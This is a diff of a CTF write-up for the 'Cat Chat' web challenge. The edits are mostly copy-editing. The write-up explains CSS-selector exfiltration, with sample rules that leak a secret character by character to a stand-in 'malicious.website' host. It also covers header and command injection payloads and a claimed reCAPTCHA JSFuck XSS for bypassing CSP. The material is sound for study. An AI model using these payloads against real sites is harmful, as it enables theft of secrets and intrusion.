@@ -1,4 +1,4 @@
-# Cat Chat &ndash; wirteup by @terjanq
+# Cat Chat &ndash; write-up by @terjanq
 
 
 ## Description
@@ -18,7 +18,7 @@ Btw, the core of the chat engine is open source! You can download the source cod
 Alright, have fun!
 
 
-In the source code, we also can find the commented section containing the commands for administrative purposes.
+In the source code we also can find the commented section containing the commands for administrative purposes.
 
 > Admin commands: 
 - `/secret asdfg` - Sets the admin password to be sent to the server with each command for authentication. It's enough to set it once a year, so no need to issue a /secret command every time you open a chat room.
@@ -42,13 +42,13 @@ Content-Security-Policy:
   frame-src 'self' https://www.google.com/recaptcha/ # `self` or from `https://www.google.com/recaptcha/*`
 ```
 *So no urls in the form of `data: ...` are allowed and any attempt of downloading a resource from an external domain will be blocked.*
-- *There are basicaly two types of the requests which I'll be respectively calling `global` and `private`. First ones are those which are being broadcasted to all participants in the chatroom such as `/report` `/ban`, `<message>` and `/name` and the seconds being seen only by the user invoking them such as `/rename` and `/secret`. These are handled by the `EventSource` object inside [catchat.js] script.*
-- *Data is being escaped only by the client side and it is done by the following function `let esc = (str) => str.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');`*
-- *When an admin joins the room he uses exactly the same page as the others but with invoked function `cleanupRoomFullOfBadPeople()`.*
+- *There are basicaly two types of the requests which I'll be respectively calling `global` and `private`. The former are those which are being broadcasted to all participants in the chatroom such as `/report` `/ban`, `<message>` and `/name` and the latter being seen only by the user invoking them such as `/rename` and `/secret`. These are handled by the `EventSource` object inside [catchat.js] script.*
+- *Data is being escaped only by the client side and it is done with a help of the following function `let esc = (str) => str.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');`*
+- *When an admin joins the room he uses exactly the same page as the others but the function `cleanupRoomFullOfBadPeople()` invoked.*
 
 
 ## CSS Injection
-It seems that every parsed element on the website is properly escaped so including an additional [DOM Element] is rather impossible. It is done by the function `esc(str)` mentioned earlier which replaces each character `'`, `"`, `<`, `>` with its [HTML Entity] substitute. But there is one improperly escaped element. The element allowing us to do the [CSS Injection]! Let's have a closer look at it.
+It seems that every parsed element on the website is properly escaped so injecting an additional [DOM Element] is rather impossible. It is done by the `esc(str)` function mentioned earlier which replaces each character `'`, `"`, `<`, `>` with its [HTML Entity] substitute. But there is one improperly escaped element. The element allowing us to do the [CSS Injection]! Let's have a closer look at it.
 ```js
 display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
 ```
@@ -59,12 +59,12 @@ We see that escaping `data.name` this way won't prevent the called vulnerability
 Firstly, we used the fact that anyone can join the same room, so we used two windows to observe the outcome. Then we changed our name to the payload above to finally call for an admin just to provoke him with the message *I ❤ dogs!* in a moment he joins. As we can see, every participant's window in the chat room, except the one getting banned, should likely turn into red. 
 
 
-But how could we use this finding to steal the admin's secret key? Well, this is the question that we have no direct response on yet but the idea is to generate a proper set of [CSS Selector Rules] sending the sensitive data over. I will shortly explain how these selectors work in a simple example. Suppose we have exactly one `<input id="secret" value="Top Secret Value"/>` element on the page and two selectors `#secret[value^=T]{background: url(http://malicious.website/?ch=T)}` and `#secret[value^=t]{background: url(http://malicious.website/?ch=t)}`. In natural language it translate to *If element of id 'secret' starts with the prefix '&lt;prefix&gt;' set its background value to '&lt;color&gt;'*. The important thing here is that the content from the provided *URL* will not be preloaded. It means that it's only fetched when the element is going to be rendered. Thanks to it, we can get to know each character in the `value` attribute by consistently expanding out the prefix of already known characters.
+But how could we use this finding to steal the admin's secret key? Well, this is the question that we have no direct answer on yet but the idea is to generate a proper set of [CSS Selector Rules] sending the sensitive data over. I will shortly explain how these selectors work in a simple example. Suppose we have exactly one `<input id="secret" value="Top Secret Value"/>` element on the page and two selectors `#secret[value^=T]{background: url(http://malicious.website/?ch=T)}` and `#secret[value^=t]{background: url(http://malicious.website/?ch=t)}`. In natural language it translates to *If element of id 'secret' starts with the prefix '&lt;prefix&gt;' set its background value to '&lt;color&gt;'*. The important thing here is that the content from the provided *URL* will not be preloaded. It means that it's only fetched when the element is going to be rendered. Thanks to it, we can get to know each character in the `value` attribute by consistently expanding out the prefix of already known characters.
 
 ## Self Injection
 But hey, we cannot send any information outside the domains included in the `CSP` header! So how can we acquire it? And what exactly are we going to steal in the first place?
 
-Let's find an answer to the second question first. We know that there is a special command `/secret <new password>` which basically sets a new password with the following calling the ``display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`)`` function. This has to be it! We can make the selectors to look like `span[data-secret^=<prefix>]{background: url(...)}`. But we still don't know how exactly could we obtain an information without sending the information out. This is the tricky part. We will use the fact that any `API` call is not being authorized, so making the URL `url(send?name=flag&msg=<prefix>)` shall result with a new message from the *flag* user on the chat, containing the prefix of the fetched secret if and only if such element exists on the page. So let's try this out!
+Let's find an answer to the second question first. We know that there is a special command `/secret <new password>` which basically sets a new password with the call of the ``display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`)`` function. This has to be it! We can make the selectors to look like `span[data-secret^=<prefix>]{background: url(...)}`. But we still don't know how exactly could we obtain an information without sending the information out. This is the tricky part. We will use the fact that any `API` call is not being authorized, so making the URL `url(send?name=flag&msg=<prefix>)` shall result with a new message from the *flag* user on the chat containing the prefix of the fetched secret if and only if such element exists on the page. So let's try this out!
 
 ![self_injection]
 
@@ -93,7 +93,7 @@ So we can send a valid header with an invalid cookie. This is exactly what we ne
 ![header_injection]
 
 ## Command Injection Failure
-Up to this moment, I went through all the steps fairly quickly. I thought then that only minutes divide me from the solution and there were no solves on the task yet as I recall correctly. But my excitation was too early and I got lost in her so badly... For my excuse it was a tough time for solving the CTF task &ndash; the middle of the **Summer Exam Session** on University I attend to.
+Up to this moment, I went through all the steps fairly quickly. I thought then that only minutes divided me from the solution and there were no solves on the task yet as I recall correctly. But my excitation was premature and I got lost in it so badly... 
 
 The solution is quite simple and I was almost there if I had only made the correct payload in time.  
 I looked at the following piece of [server.js] code
@@ -129,11 +129,11 @@ and my thoughts were:
 * **There are no breaks in the switch statement**
 * **only the first [RegExp]** `msg.match(/^\/[^ ]*/)[0]` correctly matches the command code (start of the `msg` value) and the ones inside switch statement (e.x `/\/name (.+)/`) match occurence of the command regardless the position of the *slash* character in word. 
 
-So, I tested the payload `/name super_name /secret 123456` hoping I shall see two commands from one message executed but it didn't work... I had yet tested a few similar payloads with slight modifications but after a failure, I assumed that it has to be that switches in *JavaScript* work the way *IFs* would work. I know, I know. Cleverest assumption of day. 
+So, I tested the payload `/name super_name /secret 123456` hoping I shall see two commands from one message executed but it didn't work... I had yet tested a few similar payloads with slight modifications but after a failure, I assumed that it has to be that switches in *JavaScript* work the way *IFs* would work. I know, I know. Cleverest assumption of the day. 
 
 If you read up to this place you probably know the complete solution already but before revealing it, I will try to reproduce my thinking process after rejecting that possibility. If you don't wish to read the part not exactly related to the solution, just jump into [The Command Injection Once More](#the-command-injection-once-more) :)
 
-I don't remember the exact order of the things I had tried, but it does not really matter at this point. 
+I don't remember the exact order of the things I have tried, but it does not really matter at this point. 
 Here are some interesting findings I had discovered.
 
 ### X-Forwarded-For
@@ -146,21 +146,21 @@ case '/report':
         ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
         response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
 ```
-It looks at leasy very very suspicious. The exact line I am thinking of is `var ip = req.headers['x-forwarded-for'];`. When we type `/report` in the chat our IP is beeing sent over to the admin, but purpose of it is highly unknow since we lack the knowledge of the `const admin = require('./admin');` module. But the idea itself of forging my *IP* by crafting the [HTTP header] `x-forwarded-for` to anything I desire seemed to me like a something definitely worth a try. I tested over for any kind of injection that came to my head starting with the [CSRF], ending with the [SQL Injection], and with [XSS Injection] in the middle, but assumed none of these actualy worked since I dind't get any outcome. 
+It looks at least very very suspicious. The exact line I am thinking of is `var ip = req.headers['x-forwarded-for'];`. When we type `/report` in the chat our IP is beeing sent over to the admin, but purpose of it is highly unknow since we lack the knowledge of the `const admin = require('./admin');` module. But the idea itself of forging my *IP* by crafting the [HTTP header] `x-forwarded-for` to anything I desire seemed to me like a something definitely worth a try. I tested over for any kind of injection that came to my head starting with the [CSRF], ending with the [SQL Injection], and with [XSS Injection] in the middle, but assumed none of these actually worked since I didn't get any outcome. 
 
 ### Searching for broadcast
-After that, I had decided to run my own instance of the server and test things out locally. I had tried really hard to call the `broadcast(room, msg)` function with the `/secret` command included, hoping that there is a part of code on the client side, I hadn't yet found, allowing me to execute two commands from one message in there. This attempt was of course badly unsuccessful and the payloads I was creating were ridiculous by looking at them from the time perspective. The only good thing that came out from, was the successfully created my own instance of the server that helped to test things out more effectively.
+After that, I had decided to run my own instance of the server and test things out locally. I had tried really hard to call the `broadcast(room, msg)` function with the `/secret` command injected, hoping that there is a part of code on the client side, I hadn't yet found, allowing me to execute two commands from one message in there. This attempt was of course badly unsuccessful and the payloads I was creating were ridiculous by looking at them from the time perspective. The only good thing that came out from it, was that I successfully created my own instance of the server which helped to test things out more effectively.
 
 
 ### Searching for XSS
-Even though I assumed there is no possibility of [XSS Injection], and if there was any the whole solution would zip into one-line solution and on the other hand, the path I already followed seemed to be the correct one, I was searching for possible `XSS` point on the website. And surprisingly I have found one! I found a vulnerability in the [Google reCAPTCHA] functionality. 
-`<script src="https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu"></scrip>`. I had made a closer look at this script and tried to inject some *XSS* in here. I found the line in the [api.js] looking like dynamically created `... ).push('6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');window ...`, so I tried to insert the quote character `'` to close the function call in order to insert some more code. As for the surprise, it worked! But when one tries to insert any `alphanumeric` character after it, the line changes to: `push('onload')`. So the challenge is to write a payload without using such characters. Well, we all know [JSFuck] and creating the URL: [https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');&#x5B;&#x5D;&#x5B;(!&#x5B;&#x5D;+&#x5B;&#x5D;)...();('] produces a valid JavaScript code which when attached pops out the `alert(1)`. This is a serious security gap since this can be easily used to bypass [CSP] protection on third-party websites. Just for the sake of an example, if we found a place to inject `<script>` element on the website from this task we could execute any code we want even though [CSP] was set to prevent such situations. The proper *Issue* is in the process of being completed at the time being and will be reported as soon as finished. 
+Even though I assumed there was no possibility of [XSS Injection], and if there was any the whole solution would zip into one-line solution and on the other hand, the path I already followed seemed to be the correct one, I was searching for possible `XSS` point on the website. And surprisingly I have found one! I found a vulnerability in the [Google reCAPTCHA] functionality. 
+`<script src="https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu"></script>`. I have made a closer look at this script and tried to inject some *XSS* in here. I found the line in the [api.js] looking like dynamically created `... ).push('6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');window ...`, so I tried to insert the quote character `'` to close the function call in order to insert some more code. As for the surprise, it worked! But when one tries to insert any `alphanumeric` character after it, the line changes to: `push('onload')`. So the challenge is to write a payload without using such characters. Well, we all know [JSFuck] and creating the URL: [https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu');&#x5B;&#x5D;&#x5B;(!&#x5B;&#x5D;+&#x5B;&#x5D;)...();('] produces a valid JavaScript code which when attached pops out the `alert(1)`. This is a serious security gap since this can be easily used to bypass [CSP] protection on third-party websites. Just for the sake of an example, if we found a place to inject `<script>` element on the website from this task we could execute any code we want even though [CSP] was set to prevent such situations. The proper *Issue* is in the process of being completed at the time being and will be reported as soon as finished. 
 
 
-It totally buzzed me out so I couldn't focus on the task nor my exams anymore. I was searching for a way to exploit it further, but it's not the actual subject of this write-up so let's skip it ;)
+It totally buzzed me out so I couldn't focus on the task anymore. I was searching for a way to exploit it further, but it's not the actual subject of this write-up so let's skip it ;)
 
 ### The Command Injection Once More
-After a whole daybreak, I finally realized what mistake I was making and why my switch exploits didn't work. If you look closer at the switch statements once more, you realize that there is actually a `break` between `/name` and `/secret` commands! It does seem so much invisible because it's hidden after if statement which looks kind of natural, at least for me. So testing the payload `/ban cat_hater /secret 123456; Domain=adsad` on my local instance resulted with successfully attached `/secret` command because between these two there is no `break`. We can find that admin sends the `/ban` command following the definition of function below
+After a whole daybreak, I finally realized what mistake I was making and why my `switch exploits` didn't work. If you look closer at the switch statements once more, you realize that there is actually a `break` between `/name` and `/secret` commands! It does seem so much invisible because it's hidden after `if` statement which looks kind of natural, at least for me. So testing the payload `/ban cat_hater /secret 123456; Domain=adsad` on my local instance resulted with successfully attached `/secret` command because between these two there is no `break`. We can find that an admin sends the `/ban` command following the definition of function below
 ```js
 if (msg.match(/dog/i)) {
         send(`/ban ${name}`);
@@ -171,7 +171,7 @@ So all we have to do is to send some dirty **d\*ggish message** with a name set 
 
 
 ## The complete Solution
-To automate the whole process, I have written a simple [cat_talks_solver.user.js] script, which could be included inside [Tampermonkey] extension. I have also provided with the minified version of the script [cat_talks_minified.js] where the command is very easy to copy-paste into [console]. I encourage you to reproduce all the steps by yourself, so just choose the option fits you the most and try it out! This is almost the exact function I had used during the competitions: 
+To automate the whole process, I have written a simple [cat_talks_solver.user.js] script, which could be included inside [Tampermonkey] extension. I have also provided with the minified version of the script [cat_talks_minified.js] where the command is very easy to copy-paste into [console]. I encourage you to reproduce all the steps by yourself, so just choose the option fits you the most and try it out! This is almost the exact function I had used during the competition: 
 
 ```js
 (function(){
@@ -261,9 +261,9 @@ Flag: **CTF{L0LC47S_43V3R}**
 ## My thoughts
 I think I got very unlucky with the task and as I recall correctly I had huge chances to hit the first solve on the problem (had 8-10th on the *JS Safe 2.0* already). 
 
-After all, the solution consisted of multiple vulnerabilities such as [CSS Injection](#css-injection)[Header Injection](#header-injection), [RegExp Injection](#command-injection-failure), [Insecure Switch Statement](#command-injection-failure) and [Self Injection](#self-injection) used to fetch the flag. So, in my opinion, the task has a good educational potential, especially for people not much advanced in the `Web Category` in the **CTF** World. 
+After all, the solution consisted of multiple vulnerabilities such as [CSS Injection](#css-injection)[Header Injection](#header-injection), [RegExp Injection](#command-injection-failure), [Insecure Switch Statement](#command-injection-failure) and [Self Injection](#self-injection) used to fetch the flag. So, in my opinion, the task has a good educational potential.
 
-Personally, I enjoyed the task very much even though it cost me a significant pile of hair :))
+Personally, I enjoyed the task very much even though it cost me a significant bunch of hair :))
 
 ___ 
 
